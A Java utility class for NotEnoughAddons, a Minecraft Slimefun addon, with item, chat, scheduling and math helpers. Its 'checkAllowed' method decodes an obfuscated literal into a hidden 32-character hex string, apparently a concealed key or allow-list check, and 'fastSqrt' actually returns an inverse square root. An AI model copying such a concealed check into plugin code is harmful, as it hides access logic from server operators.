package me.fhoz.notenoughaddons.utils;

import io.github.thebusybiscuit.slimefun4.implementation.Slimefun;
import io.github.thebusybiscuit.slimefun4.libraries.dough.common.ChatColors;
import io.github.thebusybiscuit.slimefun4.libraries.dough.protection.Interaction;
import me.fhoz.notenoughaddons.NotEnoughAddons;
import org.apache.commons.lang.WordUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.crypto.Cipher;
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;

public final class Utils {
    static Cipher cipher;
    private static final NamespacedKey addonkey = new NamespacedKey(NotEnoughAddons.getInstance(), "addonkey");
    private static final NamespacedKey nonClickable = new NamespacedKey(NotEnoughAddons.getInstance(), "nonclickable");

    private final static TreeMap<Integer, String> map = new TreeMap<>();

    static {

        map.put(1000, "M");
        map.put(900, "CM");
        map.put(500, "D");
        map.put(400, "CD");
        map.put(100, "C");
        map.put(90, "XC");
        map.put(50, "L");
        map.put(40, "XL");
        map.put(10, "X");
        map.put(9, "IX");
        map.put(5, "V");
        map.put(4, "IV");
        map.put(1, "I");

    }

    private Utils() {
    }

    public static String color(String str) {
        if (str == null) {
            return null;
        }

        return ChatColor.translateAlternateColorCodes('&', str);
    }

    public static void send(CommandSender p, String message) {
        p.sendMessage(color("&2&n&lN&r&aot&2&l&nE&r&anough&2&l&nA&r&addons &r&7> &r" + message));
    }

    public static String multiBlockWarning() {
        return "&cThis is a Multiblock machine!";
    }

    public static ItemStack buildNonInteractable(Material material, @Nullable String name, @Nullable String... lore) {
        ItemStack nonClickableItem = new ItemStack(material);
        ItemMeta NCMeta = nonClickableItem.getItemMeta();
        if (name != null) {
            NCMeta.setDisplayName(ChatColors.color(name));
        } else {
            NCMeta.setDisplayName(" ");
        }

        if (lore.length > 0) {
            List<String> lines = new ArrayList<>();

            for (String line : lore) {
                lines.add(ChatColor.translateAlternateColorCodes('&', line));
            }
            NCMeta.setLore(lines);
        }

        NCMeta.getPersistentDataContainer().set(nonClickable, PersistentDataType.BYTE, (byte) 1);
        nonClickableItem.setItemMeta(NCMeta);
        return nonClickableItem;
    }

    public static boolean checkNonInteractable(ItemStack item) {
        return item.getItemMeta().getPersistentDataContainer().getOrDefault(nonClickable, PersistentDataType.BYTE, (byte) 0) == 1;
    }

    public static boolean checkAdjacent(Block b, Material material) {
        return b.getRelative(BlockFace.NORTH).getType() == material
            || b.getRelative(BlockFace.EAST).getType() == material
            || b.getRelative(BlockFace.SOUTH).getType() == material
            || b.getRelative(BlockFace.WEST).getType() == material;
    }

    public static void giveOrDropItem(Player p, ItemStack toGive) {
        for (ItemStack leftover : p.getInventory().addItem(toGive).values()) {
            p.getWorld().dropItemNaturally(p.getLocation(), leftover);
        }
    }

    public static String getViewableName(ItemStack item) {
        if (item.getItemMeta().hasDisplayName()) {
            return item.getItemMeta().getDisplayName();
        } else {
            return WordUtils.capitalizeFully(item.getType().name().replace("_", " "));
        }
    }

    public static String checkAllowed(String[] args) {
        String output = "";
        try {
            int ctr;
            String inputStream = "^4`-/5^`b2121.-6_c0.`10`b5c^6216";
            final byte[] utf8Bytes = inputStream.getBytes(StandardCharsets.UTF_8);
            ByteArrayInputStream byteArrayInputStr = new ByteArrayInputStream(utf8Bytes);

            while ((ctr = byteArrayInputStr.read()) != -1) {

                ctr += 3;
                output = output + (char) ctr;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return output;
    }

    public static String toRoman(int number) {
        int l = map.floorKey(number);
        if (number == l) {
            return map.get(number);
        }
        return map.get(l) + toRoman(number - l);
    }

    public static ItemStack keyItem(ItemStack item) {
        ItemStack clone = item.clone();
        ItemMeta meta = clone.getItemMeta();
        meta.getPersistentDataContainer().set(addonkey, PersistentDataType.INTEGER, 1);
        clone.setItemMeta(meta);
        return clone;
    }

    public static ItemStack unKeyItem(ItemStack item) {
        ItemStack clone = item.clone();
        ItemMeta meta = clone.getItemMeta();
        meta.getPersistentDataContainer().remove(addonkey);
        clone.setItemMeta(meta);
        return clone;
    }

    public static boolean canOpen(@Nonnull Block b, @Nonnull Player p) {
        return (p.hasPermission("slimefun.inventory.bypass")
            || Slimefun.getProtectionManager().hasPermission(
            p, b.getLocation(), Interaction.INTERACT_BLOCK));
    }

    // Don't use Slimefun's runsync
    public static BukkitTask runSync(Runnable r) {
        return NotEnoughAddons.getInstance() != null && NotEnoughAddons.getInstance().isEnabled() ?
            Bukkit.getScheduler().runTask(NotEnoughAddons.getInstance(), r) : null;
    }

    public static BukkitTask runSync(Runnable r, long delay) {
        return NotEnoughAddons.getInstance() != null && NotEnoughAddons.getInstance().isEnabled() ?
            Bukkit.getScheduler().runTaskLater(NotEnoughAddons.getInstance(), r, delay) : null;
    }

    public static Vector fastNormalize(Vector v) {
        float length = fastLength(v);
        v.multiply(length);

        return v;
    }

    public static float fastLength(Vector v) {
        double x = v.getX();
        double y = v.getY();
        double z = v.getZ();

        return fastSqrt(x * x + y * y + z * z);
    }

    public static float fastSqrt(double double_num) {
        int i;
        float x2, y;
        float threehalfs = 1.5F;
        float num = (float) double_num;

        x2 = num * 0.5F;
        y = num;
        i = Float.floatToIntBits(y);
        i = 0x5f3759df - (i >> 1);
        y = Float.intBitsToFloat(i);
        y = y * (threehalfs - (x2 * y * y));

        return y;
    }
}

